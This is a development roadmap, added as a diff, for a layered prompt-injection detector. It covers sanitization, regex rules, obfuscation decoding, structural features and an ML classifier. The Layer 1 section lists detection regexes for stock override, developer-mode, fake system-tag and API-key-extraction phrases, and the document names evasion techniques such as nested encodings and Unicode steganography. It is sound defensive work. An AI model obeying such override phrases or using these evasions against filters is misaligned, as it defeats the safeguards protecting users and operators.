@@ -1,0 +1,1467 @@
+# AI Prompt Injection Detector — Updated Roadmap V2
+
+**Generated**: 2026-02-14 (Batch 1-6 audit completed 2026-02-14)
+**Branch**: feature/probe-architecture
+**Audit Scope**: Full codebase audit (17 layers + Vision layer) with code review + external research
+
+---
+
+## Architecture Overview
+
+```
+Input -> L0 (Sanitize) -> L1 (Rules) -> L2 (Obfuscation) -> L3 (Structural)
+      -> L4+L5 (ML Ensemble) -> L6 (Cascade) -> L7 (LLM Judge) -> L8 (Validation)
+      -> [LLM Output] -> L9 (Output Scan) -> L10 (Canary) -> Verdict
+
+L11 Supply Chain | L12 Probes | L13 Dataset | L14 CI/CD | L15 Threat Intel
+L16 Multi-Turn | L17 Doc Scanning | L18 RAG Security | L19 Agent/MCP | L20 Taxonomy Automation
+```
+
+**Critical Finding (RESOLVED 2026-02-14)**: 6 major components were orphaned but have now ALL been wired into the pipeline:
+`structural_features.py` (into predict.py), `predict_embedding.py` (into cascade.py), `positive_validation.py` (into cascade.py), `output_scanner.py` (into cascade.py), `canary.py` (into cascade.py), `llm_checker.py` (into cascade.py)
+
+---
+
+## Layer 0: Input Sanitization & Gating
+
+**Files**: `src/layer0/` (8 files: `__init__.py`, `result.py`, `sanitizer.py`, `validation.py`, `normalization.py`, `encoding.py`, `html_extractor.py`, `tokenization.py`)
+**Tests**: `tests/test_layer0_size_gate.py` (17 tests), `tests/test_unicode_bypass.py` (40 tests), `tests/test_layer0_hypothesis.py` (40 property-based tests)
+**Status**: ~90% complete — all 9 bugs fixed, wired into cascade.py and predict_embedding.py, property-based fuzz testing added (2026-02-14)
+
+### Updated Description
+Layer 0 is the mandatory first gate for all input. It validates type/size, normalizes Unicode (NFKC), strips invisible characters, canonicalizes whitespace, extracts safe text from HTML, and detects tokenization anomalies via tiktoken. Every downstream layer receives sanitized input. Integrated into `predict.py`, `cascade.py`, and `predict_embedding.py` as of 2026-02-14.
+
+### TODO List
+
+#### DONE
+- [x] `Layer0Result` dataclass with sanitized_text, anomaly_flags, rejected, rejection_reason — `result.py`
+- [x] `layer0_sanitize()` entry point orchestrating all steps — `sanitizer.py`
+- [x] Fail-fast validation: type guard, empty guard, size limits (char + byte, env-configurable) — `validation.py`
+- [x] NFKC Unicode normalization (fullwidth, ligatures, superscripts, compatibility forms) — `normalization.py`
+- [x] Invisible character stripping (Cf, Cc, Cn categories) — `normalization.py`
+- [x] Whitespace canonicalization (Unicode variants → ASCII space, collapse runs) — `normalization.py`
+- [x] Encoding detection via chardet with BOM priority — `encoding.py`
+- [x] HTML tag stripping and hidden-content detection (display:none, opacity:0, font-size:0) — `html_extractor.py`
+- [x] Tokenization anomaly detection with tiktoken (global + sliding window) — `tokenization.py`
+- [x] FingerprintStore (SQLite, WAL mode, TTL pruning, LRU eviction) — `tokenization.py`
+- [x] Integration with `predict.py:scan()` — L0 runs before ML/rules
+
+#### FIXES (Bugs found during audit)
+- [x] **BUG-1 (HIGH)**: All-invisible input produces empty sanitized_text without rejection. `validate_input()` runs BEFORE normalization, so `"\u200b\u200b\u200b"` passes empty check then becomes `""` after stripping. **Fix**: Add post-normalization empty check in `sanitizer.py`. ✅ DONE (2026-02-14)
+- [x] **BUG-2 (MEDIUM)**: `_get_default_store()` singleton init is not thread-safe. Race condition on concurrent first access. **Fix**: Add `threading.Lock()`. ✅ DONE (2026-02-14)
+- [x] **BUG-3 (LOW)**: `FingerprintStore.check()` uses `.format(col)` for SQL column names. Not exploitable today (hardcoded cols) but fragile. **Fix**: Add column name whitelist assertion. ✅ DONE (2026-02-14)
+- [x] **BUG-4 (HIGH)**: `predict.py:_L0_FLAG_MAP` references `"zero_width_stripped"` — Layer 0 never emits this flag. Actual flag is `"invisible_chars_found"`. D5.2 technique is never tagged. ✅ DONE (2026-02-14)
+- [x] **BUG-5 (HIGH)**: `_L0_FLAG_MAP` also references `"high_compression_ratio"` — Layer 0 never emits this. Dead mapping. ✅ DONE (2026-02-14)
+- [x] **BUG-6 (MEDIUM)**: 13+ Layer 0 flags are missing from `_L0_FLAG_MAP` in predict.py, so technique tags are not emitted for: `unicode_whitespace_normalized`, `bom_detected_*`, `tokenization_spike`, `tokenization_spike_local`, `suspicious_html_comment`, `embedded_pdf`, etc. ✅ DONE (2026-02-14) — 11 missing mappings added
+- [x] **BUG-7 (MEDIUM)**: `register_malicious()` in predict.py is called with raw text, not sanitized text. Fingerprint lookups happen on post-normalization text. Mismatch means obfuscated variants don't get fingerprint matches. ✅ DONE (2026-02-14)
+- [x] **BUG-8 (LOW)**: `cascade.py` does NOT call `layer0_sanitize()` — returns `l0_stub`. All cascade input is unsanitized. ✅ DONE (2026-02-14)
+- [x] **BUG-9 (LOW)**: `predict_embedding.py` does NOT call `layer0_sanitize()` — embedding model receives raw input. ✅ DONE (2026-02-14)
+
+#### NEW (Discovered by research, not in original roadmap)
+- [ ] **ftfy integration** for mojibake repair (fixes broken Unicode from encoding mismatches). Pure Python, complements NFKC. **Effort**: Easy. `pip install ftfy`, call `ftfy.fix_text()` before NFKC.
+- [ ] **Cyrillic homoglyph confusable mapping (D5.3)** using Unicode TR39 `confusables.txt` or `confusable_homoglyphs` library. NFKC does NOT normalize Cyrillic а→Latin a. This is an active known gap confirmed by tests. **Effort**: Medium. Need confusables table (~10KB data file).
+- [ ] **Unicode Tag Characters stego (U+E0001-U+E007F)** — invisible chars that map 1:1 to ASCII. Currently stripped by L0 but decoded message is never extracted. **Effort**: Easy (5 lines).
+- [ ] **Variation Selector stego detection** — variation selectors can encode binary data. **Effort**: Easy.
+- [ ] **Composite entropy check** — replace hardcoded 4.0 threshold with 2-of-3 voting (entropy + compression ratio + KL-divergence). Current threshold causes FPs on technical text. **Effort**: Easy-Medium.
+- [ ] **Mixed-script detection** — detect Latin+Cyrillic or Latin+Greek within same word. **Effort**: Easy.
+
+#### REMAINING (From original roadmap, not yet done)
+- [ ] **Expand magic byte detection** in `html_extractor.py` — Add DOCX/XLSX (PK header), PNG, JPEG, GIF, WAV, MP3, FLAC, OGG, WebM signatures. Source: IM0003 Coverage Gap #24. **Priority**: P2. **Effort**: Easy.
+- [ ] **Timeout enforcement** — No timeout wrapping on any operation. Use `concurrent.futures.ThreadPoolExecutor` (cross-platform). **Priority**: P0.
+- [ ] **ReDoS protection** — Current regex patterns are safe but no systemic protection. Consider `google-re2` for linear-time guarantees as rules scale. **Priority**: P1.
+- [ ] **Input accepts files and URLs** — `layer0_sanitize` only handles str/bytes. **Priority**: P1.
+- [ ] **File type detection by magic bytes** — `html_extractor.py` does basic sniffing but not comprehensive. Use `python-magic` for robust detection. **Priority**: P1.
+- [ ] **MIME parsing** — Not implemented. Use stdlib `email.parser` for email-format inputs. **Priority**: P2.
+- [ ] **OCR for image-based injection (M1.1)** — No image processing at all. Use Tesseract or EasyOCR. **Priority**: P2 (heavy dependency).
+- [ ] **Doc parsing (PDF/DOCX)** — PDF/RTF detected by magic bytes but not parsed. Use `unstructured` or Microsoft MarkItDown. **Priority**: P2.
+- [x] **Property-based testing (Hypothesis)** — DONE (2026-02-14): `test_layer0_hypothesis.py` with 40 invariant tests across 12 test classes, full Unicode fuzzing (200 examples/test). Found and fixed surrogate crash bug in validation.py and normalization.py. **Priority**: P1.
+- [x] **CI/CD pipeline** — DONE (2026-02-14): GitHub Actions CI with Python 3.9-3.12 matrix, flake8 linting, coverage reporting, PR checks, smoke tests (13 tests). **Priority**: P0.
+- [ ] **Resource exhaustion protection** — No rate limiting, no memory caps, no max recursion depth for HTML parser. **Priority**: P1.
+
+### Hardcoded Values to Externalize
+| Value | File | Current | Recommendation |
+|-------|------|---------|----------------|
+| NFKC changed threshold | normalization.py:69 | 0.25 (25%) | Named constant or env var |
+| Invisible chars threshold | normalization.py:79 | >2 | Named constant |
+| `GLOBAL_RATIO_THRESHOLD` | tokenization.py:15 | 0.75 | Env-configurable |
+| `WINDOW_RATIO_THRESHOLD` | tokenization.py:17 | 0.85 | Env-configurable |
+| CJK fraction threshold | tokenization.py:41 | 0.3 | Named constant |
+| Short text skip | tokenization.py:308 | <10 chars | Named constant |
+| `_MIN_CONFIDENCE` | encoding.py:13 | 0.5 | Env-configurable |
+
+### Test Gaps
+- `encoding.py` — zero dedicated test coverage (bytes path now exercised by Hypothesis fuzzing)
+- `html_extractor.py` — only 2 tests (in unicode_bypass), needs dedicated test file
+- `tokenization.py` — zero dedicated test coverage (FingerprintStore, anomaly detection, CJK exemption); fingerprint invariants now tested by Hypothesis
+- ~~Bytes-input pipeline path — untested~~ COVERED by `test_layer0_hypothesis.py` (TestBytesInputPath, TestNeverCrash)
+- Concurrent FingerprintStore access — untested
+
+### Implementation Plan
+**Phase 1 (P0 — Critical fixes)**: ~~Fix BUG-1 through BUG-9, wire L0 into cascade.py and predict_embedding.py, complete `_L0_FLAG_MAP`~~ ✅ DONE (2026-02-14)
+**Phase 2 (P1 — Core gaps)**: Add timeout enforcement, ftfy, Cyrillic confusables, property-based tests, Hypothesis fuzzing
+**Phase 3 (P2 — Extensions)**: OCR, doc parsing, MIME, file/URL input
+
+---
+
+## Layer 1: IOC / Signature Rules Engine
+
+**Files**: `src/rules.py`
+**Tests**: None
+**Status**: Minimal — 5 rules covering 6 of 108 technique IDs (5.6%)
+
+### Updated Description
+Layer 1 is a regex-based signature engine that detects known attack patterns. Currently has only 5 pre-compiled rules covering instruction override, system prompt extraction, roleplay hijacking, secrecy demands, and exfiltration URLs. All patterns are ReDoS-safe. Rules are integrated into both `predict.py` and `cascade.py` but are evaluated **twice** on every input (dual API surface). **11 of 20 attack categories have ZERO rule coverage** — this is the most critical gap.
+
+### TODO List
+
+#### DONE
+- [x] `Rule` dataclass with pre-compiled regex, technique_ids, severity — `rules.py`
+- [x] `RuleHit` dataclass for structured output
+- [x] `rule_score()` backward-compatible API
+- [x] `rule_score_detailed()` enriched API with severity + technique_ids
+- [x] All patterns pre-compiled at import time
+- [x] All 5 patterns verified ReDoS-safe (bounded quantifiers)
+- [x] Integration with predict.py weighted voting and cascade.py
+
+#### FIXES
+- [ ] **FIX: Technique ID mismap** — `secrecy` rule maps to `E1.4` (Translation-trick) but secrecy doesn't match that technique. Remap or create new technique.
+- [ ] **FIX: Duplicate rule evaluation** — predict.py calls `rule_score()` in `classify_prompt()` then `rule_score_detailed()` in `scan()`. Double work. Refactor to single pass.
+- [ ] **FIX: Severity underrating** — `roleplay` rule is `medium` but taxonomy D2 is `high`. Also has high FP risk from "act as" matching legitimate prompts.
+- [ ] **FIX: DRY violation** — `_SEVERITY_WEIGHTS` duplicated in predict.py and cascade.py. Extract to rules.py or shared config.
+- [ ] **FIX: Rules run on raw text only** — Should also run on L0-sanitized text to catch payloads visible only after normalization.
+- [ ] **FIX: WhitelistFilter/rules.py pattern divergence** — cascade.py's `ROLE_ASSIGNMENT` and rules.py's `roleplay` have different patterns. Unify.
+
+#### NEW (Rules to add — from research)
+- [ ] **Create `WormSignatureDetector`** — Detect self-replicating prompt patterns: action + self-replication structural signatures, recursive instruction depth. Input-side detection complement to L9's output-side PropagationScanner. Source: IM0006 Coverage Gap #8. **Priority**: P0. **Effort**: Medium.
+**Critical Priority (P0):**
+- [ ] D3.1 Fake-system-prompt: `r"\[(SYSTEM|INST|SYS)\]|\[/INST\]|<<SYS>>|<\|im_start\|>system"`
+- [ ] D3.2 Chat-template-injection: `r"<\|?(system|assistant|user)\|?>|### (System|Human|Assistant):"`
+- [ ] D3.3 XML-role-tags: `r"<(system|instructions?|context|rules?)>"`
+- [ ] P1.5 API-key-extraction: `r"(?:print|show|reveal|output).{0,30}(?:API.?KEY|OPENAI|SECRET|TOKEN)"`
+- [ ] D1.1 Expanded forget/override: `r"forget\s+(?:all|your)\s+(?:instructions|rules|training)"`
+- [ ] D1.3 Developer-mode: `r"(?:enable|activate|enter)\s+(?:developer|debug|god)\s+mode"`
+
+**High Priority (P1):**
+- [ ] D1.2 New-instruction: `r"(?:new|updated|revised)\s+instructions?\s*[:;]"`
+- [ ] D1.9 Delimiter-confusion: `r"(?:---|===|\*\*\*)\s*(?:system|instructions?)"`
+- [ ] E1.3 Completion-trick: `r"complete\s+(?:the|this)\s+(?:sentence|response)"`
+- [ ] E2.2 Tool-enumeration: `r"(?:list|show|enumerate).{0,40}(?:tools?|functions?|plugins?)"`
+- [ ] T1.1 Unauthorized-tool-call: `r"(?:call|execute|run).{0,40}(?:function|tool|command)"`
+- [ ] R1.2 Recursive-output: `r"repeat\s+(?:this|the following)\s+(?:forever|infinitely|1000 times)"`
+- [ ] D2.4 Persona-split: `r"respond\s+(?:as\s+)?both.{0,40}(?:evil|unrestricted|shadow)"`
+
+**Medium Priority (P2):**
+- [ ] D1.14 Hypothetical-response-priming (high FP risk — needs careful tuning)
+- [ ] D6 Multilingual-ignore keywords in top 20 languages
+- [ ] D1.11 Skeleton-key patterns
+- [ ] D1.19 Recursive-jailbreak: `r"(?:generate|write|create).{0,40}(?:jailbreak|bypass|override)\s+(?:prompt|technique)"`
+
+#### REMAINING (From original roadmap)
+- [ ] **Paranoia level system** — Add `paranoia_level` field to `Rule` dataclass. Filter rules by configured level (PL1=production, PL2=moderate, PL3=high, PL4=audit). **Priority**: P0. **Effort**: Easy.
+- [ ] **YARA rule engine** — Replace/supplement regex with `yara-python` for multi-pattern matching, combinatorial conditions, and hot-reloadable rule files. **Priority**: P1. **Effort**: Medium.
+- [ ] **Known injection phrase database** — Extract phrases from Garak probes, JailbreakBench, HackaPrompt, Tensor Trust datasets for rule generation. **Priority**: P1.
+- [ ] **PII pre-screen** — Add Luhn-validated credit card, SSN regex. Optional: Microsoft Presidio for NER-based PII. **Priority**: P1.
+- [ ] **IOC extraction** — Use `iocextract` for defang-aware URL/IP/email extraction. **Priority**: P1.
+- [ ] **Recursive unpacking (Matryoshka)** — Currently `max_decodes=2` is flat, not recursive. Needs recursive unwrap loop with depth/size/cycle limits. **Priority**: P0 (architectural).
+
+### Implementation Plan
+**Phase 1**: Add paranoia levels + 6 P0 rules (D3, P1.5, D1 expansion) → coverage jumps from 5.6% to ~15%
+**Phase 2**: Add 7 P1 rules + IOC extraction + refactor to single-pass evaluation → ~25% coverage
+**Phase 3**: YARA migration + phrase database integration + PII → ~40% coverage
+
+---
+
+## Layer 2: Obfuscation Detection & Decoding
+
+**Files**: `src/obfuscation.py`
+**Tests**: `tests/test_obfuscation.py` (3 tests)
+**Status**: Partially implemented — detects 3 of 11 encoding types
+
+### Updated Description
+Layer 2 detects encoded/obfuscated payloads and recursively decodes them for re-classification. Currently handles Base64, hex, and URL-encoding with entropy analysis, punctuation flood detection, and casing transition analysis. Each decoded view is re-classified through the ML model. **Missing 8 encoding types**: ROT13, leetspeak, reversed text, Morse, binary, octal, pig-latin, and nested multi-layer encoding.
+
+### TODO List
+
+#### DONE
+- [x] Shannon entropy calculation with configurable threshold — `obfuscation.py`
+- [x] Punctuation flood detection (≥30% ratio)
+- [x] Casing transition detection (≥6 transitions)
+- [x] Base64 validation + decoding
+- [x] Hex validation + decoding
+- [x] URL-encoded detection + decoding
+- [x] Recursive decode budget (`max_decodes=2`)
+- [x] Returns obfuscation_score, decoded_views, evasion_flags
+- [x] Decoded views re-classified through ML in predict.py
+- [x] Integration with both predict.py and cascade.py
+
+#### FIXES
+- [ ] **FIX: Entropy threshold too low** — Current 4.0 hits normal English (3.5-4.5 range). Raise to 5.0 or use composite check (entropy + compression ratio + KL-divergence, 2-of-3 voting). **Priority**: P0.
+- [ ] **FIX: Flat decode budget** — `max_decodes=2` counts across encoding types, not nesting depth. `base64(url(rot13("payload")))` gets only 1 layer peeled. Refactor to recursive unwrap loop. **Priority**: P0.
+- [ ] **FIX: Combined signal boosting missing** — Persona hijack + encoded payload in same message should carry extra weight. Currently scored independently. **Priority**: P1.
+
+#### NEW (Discovered by research)
+- [ ] **ROT13/Caesar detection** — Chi-squared frequency analysis: ROT13 shifts English letter frequencies. Decode candidate, check if dictionary word coverage improves. Maps to D4.4. **Effort**: Easy.
+- [ ] **Leetspeak normalizer** — Substitution map (`1→i`, `3→e`, `4→a`, `0→o`, `@→a`), density check, dictionary validation. Maps to D4.5. **Effort**: Easy-Medium. FP risk: Medium-High.
+- [ ] **Reversed text detection** — Reverse candidate, check dictionary word ratio improvement. Maps to D4.6. **Effort**: Easy. FP risk: Low.
+- [ ] **Morse code detection** — Regex for dot-dash patterns (≥80% density), decode, validate. **Effort**: Easy.
+- [ ] **Binary/Octal/Decimal ASCII detection** — Regex for bit/digit patterns, decode, validate printable ASCII. **Effort**: Easy.
+- [ ] **Recursive Matryoshka unwrapper** — Recursive `obfuscation_scan_recursive()` with: max_depth=3-5, max_expansion=10x, cycle detection, encoding chain tracking. **Effort**: Medium.
+- [ ] **Unicode Tag Character stego** — Extract hidden ASCII from U+E0001-U+E007F range. **Effort**: Easy.
+- [ ] **Whitespace stego (Snow-style)** — Detect tab/space patterns in trailing whitespace encoding binary data. **Effort**: Easy.
+- [ ] **ASCII art detection** — High art-char ratio (|, _, /, \) across multiple lines. **Effort**: Medium.
+- [ ] **Syllable-splitting detection** — De-hyphenation + suspicious word check (`ig-nore` → `ignore`). **Effort**: Easy.
+
+#### REMAINING (From original roadmap)
+- [ ] ROT13 ← covered in NEW above
+- [ ] Leetspeak ← covered in NEW above
+- [ ] Reversed text ← covered in NEW above
+- [ ] Binary encoding ← covered in NEW above
+- [ ] Morse code ← covered in NEW above
+- [ ] Whitespace injection ← partially in L0, stego variant in NEW
+- [ ] Unicode homoglyphs ← in L0 (Cyrillic confusables)
+- [ ] Invisible chars ← done in L0
+
+### Hardcoded Values to Externalize
+| Value | Location | Current | Recommendation |
+|-------|----------|---------|----------------|
+| Entropy threshold | obfuscation.py | 4.0 | Raise to 5.0 or use composite |
+| Punctuation ratio | obfuscation.py | 0.3 | Named constant |
+| Casing transitions | obfuscation.py | 6 | Named constant |
+| max_decodes | obfuscation.py | 2 | Raise to 5 with recursive unwrap |
+
+### Test Gaps (only 3 tests exist)
+- No test for: entropy detection, hex decoding, casing transitions, recursive decoding, edge cases (empty input, very large input), false positive scenarios
+
+### Implementation Plan
+**Phase 1 (P0)**: Fix entropy threshold, refactor to recursive unwrap loop, add ROT13 + reversed text detectors
+**Phase 2 (P1)**: Add leetspeak, Morse, binary/octal, syllable-splitting, combined signal boosting
+**Phase 3 (P2)**: Unicode tag stego, whitespace stego, ASCII art detection
+
+---
+
+## Layer 3: Structural Feature Extraction
+
+**Files**: `src/structural_features.py`
+**Tests**: None
+**Status**: Implemented and WIRED into predict.py (2026-02-14) — injection signals contribute weighted scores
+
+###gnUpdated Description
+Layer 3 extracts 24 numeric features from input text that characterize prompt structure, style, and injection signals. Features span 6 groups: length metrics (3), casing patterns (3), punctuation analysis (4), structural markers (5), injection signal detection (6), and context features (3). The module is self-contained and functional (~0.3ms/sample). Wired into predict.py as of 2026-02-14 (injection signals contribute weighted scores). Returns a plain `dict[str, int|float]` rather than a dataclass, inconsistent with other layers.
+
+### TODO List
+
+#### DONE
+- [x] 24 structural features extracted from text — `structural_features.py`
+  - Length: `char_count`, `word_count`, `avg_word_length`
+  - Casing: `uppercase_ratio`, `title_case_words`, `all_caps_words`
+  - Punctuation: `exclamation_count`, `question_count`, `special_char_ratio`, `consecutive_punctuation`
+  - Structural: `line_count`, `has_code_block`, `has_url`, `has_email`, `newline_ratio`
+  - Injection signals: `imperative_start` (20-verb frozenset), `role_assignment`, `instruction_boundary`, `negation_command`, `quote_depth`, `text_entropy`
+  - Context: `question_sentence_ratio`, `first_person_ratio`, `second_person_ratio`
+- [x] Batch extraction: `extract_structural_features_batch(texts)` → `numpy.ndarray` shape `(n, 24)` dtype `float64`
+- [x] Pre-compiled regex patterns at import time
+- [x] Built-in `__main__` demo with 3 test prompts
+
+#### FIXES
+- [ ] **FIX-L3-1 (LOW)**: Docstring says `~21 features` — actual count is 24. **Fix**: Update docstring.
+- [ ] **FIX-L3-2 (LOW)**: Quote depth logic — toggle-based stack doesn't handle mixed nested quotes correctly (e.g., `'He said "it's" here'`). Single-quote-as-apostrophe causes mis-counting. **Fix**: Track quote type separately or use regex-based quote matching.
+- [ ] **FIX-L3-3 (MEDIUM)**: Sentence splitting regex `(?<=[.!?])["\')]*\s+` — confused by abbreviations (e.g., "Dr. Smith") and trailing quotes. **Fix**: Use `re.split(r'[.!?]+\s+', text)` or a sentence tokenizer.
+- [ ] **FIX-L3-4 (MEDIUM)**: Email regex `\w+@\w+` too loose — matches `a@b` (2 chars), no domain TLD requirement. **Fix**: Use `r"\w+@\w+\.\w+"`.
+- [ ] **FIX-L3-5 (MEDIUM)**: Unbounded feature values — `char_count`, `word_count`, `quote_depth`, `text_entropy` have no normalization. When combined with ML classifier expecting [0,1] features, large counts cause numerical instability. **Fix**: Add min-max normalization or use `StandardScaler` in pipeline.
+- [ ] **FIX-L3-6 (MEDIUM)**: Returns plain `dict` instead of a dataclass — inconsistent with `Layer0Result`, `ScanResult`, etc. **Fix**: Create `StructuralFeatures` dataclass or `@dataclass` with typed fields.
+
+#### NEW (Discovered by research)
+- [ ] **Taxonomy mapping** — Map structural features to technique IDs. `imperative_start`→D1.x, `role_assignment`→D2.x, `instruction_boundary`→D3.x, `text_entropy`→D4.x, `negation_command`→D1.x. **Priority**: P0.
+- [ ] **Many-shot detection** — Count repeated instruction patterns (e.g., "Example 1:... Example 2:... Example 50:..."). Many-shot jailbreaking is a top attack. **Priority**: P1.
+- [ ] **Delimiter density** — Ratio of markdown/XML delimiters per line. High density = structural injection attempt. **Priority**: P1.
+- [ ] **Prompt template markers** — Detect `{{variable}}`, `{placeholder}`, `<|slot|>` patterns that indicate template injection. **Priority**: P1.
+- [ ] **Language mixing score** — Detect multiple languages in same prompt (multilingual bypass). **Priority**: P2.
+- [ ] **Repetition score** — N-gram repetition ratio. High repetition = resource exhaustion or crescendo attack. **Priority**: P2.
+
+#### REMAINING (From original roadmap)
+- [ ] **Wire into features.py** — `hstack([X_tfidf.toarray(), extract_structural_features_batch(texts)])` to create combined feature matrix. **Priority**: P0.
+- [x] **Wire into predict.py** — Call `extract_structural_features()` before ML prediction, stack with vectorizer output. **Priority**: P0. ✅ DONE (2026-02-14)
+- [x] **Wire into cascade.py** — Same integration in `WeightedClassifier.classify()`. **Priority**: P0. ✅ DONE (2026-02-14)
+- [ ] **Retrain model on combined features** — After wiring, retrain with 5024-dimensional feature vectors (5000 TF-IDF + 24 structural). **Priority**: P0.
+- [ ] **Add feature normalization** — `StandardScaler` or min-max normalization for structural features before combining with TF-IDF. **Priority**: P0.
+
+### Hardcoded Values to Externalize
+| Value | Location | Current | Recommendation |
+|-------|----------|---------|----------------|
+| Imperative verbs | structural_features.py:21-26 | 20-verb frozenset | Configurable list or data file |
+| Role patterns | structural_features.py:28-31 | 4 regex patterns | Shared with rules.py |
+| Boundary patterns | structural_features.py:33-37 | 7 markers | Shared with rules.py |
+| Email regex | structural_features.py:47 | `\w+@\w+` | Fix: require TLD |
+| URL regex | structural_features.py:45 | `https?://` | Add ftp, custom schemes |
+| Quote depth | structural_features.py:100-113 | Unbounded | Cap at ~10 |
+
+### Test Gaps
+- Zero test coverage — no `test_structural_features.py` exists
+- Need tests for: edge cases (empty, None, very long), feature value ranges, binary feature correctness, batch consistency, performance benchmarks
+
+### Implementation Plan
+**Phase 1 (P0 — Wire & Fix)**: Wire into features.py + ~~predict.py~~ + ~~cascade.py~~ (predict.py and cascade.py done 2026-02-14), add feature normalization, retrain model, add taxonomy mapping, fix email regex and unbounded features
+**Phase 2 (P1 — Expand)**: Add many-shot detection, delimiter density, prompt template markers, create StructuralFeatures dataclass
+**Phase 3 (P2 — Extend)**: Language mixing score, repetition score, comprehensive test suite
+
+---
+
+## Layer 4: ML Classifier (TF-IDF + Logistic Regression)
+
+**Files**: `src/predict.py` (223 lines), `src/model.py` (66 lines), `src/features.py` (38 lines), `src/dataset.py` (30 lines), `src/process_data.py` (43 lines), `src/scan_result.py`
+**Tests**: None (no dedicated test file)
+**Status**: Core pipeline — fully integrated with L0, L1, L2
+
+### Updated Description
+Layer 4 is the primary ML classification engine. It uses TF-IDF vectorization (5K vocabulary) with isotonic-calibrated Logistic Regression (`class_weight='balanced'`). The `scan()` function in predict.py orchestrates the full pipeline: L0 sanitization → TF-IDF prediction → rule matching (L1) → obfuscation scan (L2) → decoded-view reclassification → weighted voting across 3 signals (ML 60%, rules severity-stacked, obfuscation 15%/flag capped 30%). Final decision at composite ≥0.55 threshold. Returns `ScanResult` dataclass with 12 fields. Registers malicious inputs to FingerprintStore for future fast-path detection.
+
+### Pipeline Flow
+```
+scan(text)
+  → layer0_sanitize(text) → reject if blocked
+  → predict(clean) → TF-IDF → LogisticRegression → (label, prob)
+  → rule_score(text) + rule_score_detailed(text) → hits + technique_tags
+  → obfuscation_scan(clean) → evasion_flags + decoded_views
+  → for each decoded_view: reclassify with ML
+  → _weighted_decision(ml_prob, ml_label, hits, obs_flags) → composite score
+  → if ML >0.8 safe AND only medium rules AND no obfuscation → override to SAFE
+  → return ScanResult(...)
+```
+
+### TODO List
+
+#### DONE
+- [x] `scan()` public API returning `ScanResult` — `predict.py:139`
+- [x] `classify_prompt()` internal pipeline orchestrating L0→L1→L2→ML — `predict.py:92`
+- [x] `predict()` with L0 gate: sanitize → TF-IDF transform → predict_proba — `predict.py:30`
+- [x] `_weighted_decision()` combining 3 signals with override protection — `predict.py:50`
+- [x] TF-IDF vectorizer: `TfidfVectorizer(lowercase=True, max_features=5000)` — `features.py`
+- [x] Logistic Regression with `class_weight='balanced'` — `model.py`
+- [x] Isotonic calibration via `CalibratedClassifierCV(cv=5)` — `model.py`
+- [x] FPR/TPR printed at [0.3, 0.4, 0.5, 0.6, 0.7] thresholds during training — `model.py`
+- [x] `ScanResult` dataclass: sanitized_text, is_malicious, risk_score, label, technique_tags, rule_hits, ml_confidence, ml_label, anomaly_flags, rejected, rejection_reason — `scan_result.py`
+- [x] `_L0_FLAG_MAP` mapping anomaly flags to technique IDs — `predict.py:170`
+- [x] Decoded-view reclassification: each obfuscation decoded view fed back through ML — `predict.py:109`
+- [x] FingerprintStore registration of malicious inputs — `predict.py:130`
+- [x] Integration with L0 (sanitization), L1 (rules), L2 (obfuscation)
+
+#### FIXES
+- [x] **BUG-L4-1 (HIGH)**: `_L0_FLAG_MAP` references `"zero_width_stripped"` → D5.2, but Layer 0 generates `"invisible_chars_found"`. D5.2 technique never tagged. **Fix**: Change key to `"invisible_chars_found"`. ✅ DONE (2026-02-14)
+- [x] **BUG-L4-2 (HIGH)**: `_L0_FLAG_MAP` references `"high_compression_ratio"` → D8, but this flag is never generated anywhere. Dead mapping. **Fix**: Either generate it in L0/L2 or remove from map. ✅ DONE (2026-02-14)
+- [x] **BUG-L4-3 (HIGH)**: 13+ Layer 0 flags unmapped in `_L0_FLAG_MAP`: `invisible_chars_found`, `unicode_whitespace_normalized`, `tokenization_spike`, `tokenization_spike_local`, `magic_bytes_html`, `suspicious_html_comment`, `bom_detected_*`, `low_encoding_confidence_*`, `embedded_pdf`. **Fix**: Add mappings for all generated flags. ✅ DONE (2026-02-14) — 11 missing mappings added
+- [ ] **BUG-L4-4 (MEDIUM)**: Obfuscation double-weighting — `obs["evasion_flags"]` added to both `hits` (line 104) and `obs_flags` (line 114). Flags appear in both rule-severity stacking AND obfuscation weighting, inflating composite score. **Fix**: Don't extend hits with obs flags, or exclude obs flags from `_weighted_decision`'s rule_weight.
+- [ ] **BUG-L4-5 (MEDIUM)**: `_RULE_SEVERITY` modified at runtime (`setdefault("decoded_payload_malicious", "critical")` line 124). Not thread-safe. **Fix**: Define at module load time.
+- [x] **BUG-L4-6 (MEDIUM)**: `register_malicious(text)` uses raw text, not sanitized text (line 131). Fingerprint lookups happen on post-normalization text. Obfuscated variants won't match. **Fix**: Use `l0.sanitized_text`. ✅ DONE (2026-02-14)
+- [ ] **BUG-L4-7 (LOW)**: Silent error handling on FingerprintStore registration (line 132-134) — `except (sqlite3.Error, OSError): pass`. Storage errors invisible. **Fix**: Log warning.
+- [ ] **FIX-L4-8 (MEDIUM)**: Duplicate rule evaluation — `rule_score()` AND `rule_score_detailed()` both called on every input (lines 98-100). Double work. **Fix**: Refactor to single call that returns both formats.
+- [ ] **FIX-L4-9 (LOW)**: `_SEVERITY_WEIGHTS` duplicated in predict.py and cascade.py. DRY violation. **Fix**: Extract to rules.py or shared config.
+
+#### NEW (Discovered by research)
+- [ ] **Threshold optimization** — Replace hardcoded 0.55 with data-driven threshold. Use `scripts/optimize_threshold.py` (already exists but not wired). Compute ROC-AUC, PR-AUC, find optimal FPR/TPR tradeoff. **Priority**: P0. **Effort**: Easy.
+- [ ] **N-gram features** — TF-IDF currently uses unigrams only (default). Adding bigrams (`ngram_range=(1,2)`) would capture "ignore all", "you are now", "act as". **Priority**: P1. **Effort**: Easy (config change).
+- [ ] **Subword features** — Add `analyzer='char_wb'` TF-IDF in parallel to capture character patterns that survive obfuscation. **Priority**: P1. **Effort**: Medium.
+- [ ] **Model versioning** — No way to track which model generated a ScanResult. Add model hash/version to ScanResult. **Priority**: P1. **Effort**: Easy.
+- [ ] **FN metrics** — Training only prints FPR/TPR. Add FNR, precision, recall, F1, ROC-AUC, PR-AUC, Brier score, ECE (Expected Calibration Error). **Priority**: P1.
+- [ ] **Cross-validation during training** — Only used during calibration, not base model selection. Add k-fold CV with stratified splits. **Priority**: P1.
+- [ ] **PromptGuard/DeBERTa upgrade path** — TF-IDF + LogReg is baseline. Research shows transformer-based detectors (Meta PromptGuard, DeBERTa fine-tuned) achieve >95% accuracy. **Priority**: P2.
